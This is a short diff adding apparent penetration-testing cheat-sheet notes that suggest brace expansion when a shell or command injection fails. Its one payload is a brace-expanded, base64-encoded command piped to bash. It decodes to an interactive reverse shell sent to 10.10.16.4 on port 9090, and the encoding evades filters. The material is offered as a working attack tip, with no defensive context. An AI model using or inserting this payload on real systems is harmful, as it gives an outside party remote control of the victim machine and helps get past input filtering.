@@ -1,0 +1,3 @@
+1. If a regular shell is not working , try brace expansion
+    - {echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC85MDkwICAwPiYxICAK}|{base64,-d}|bash
+2. If a regular command injection is not working, try brace expansion
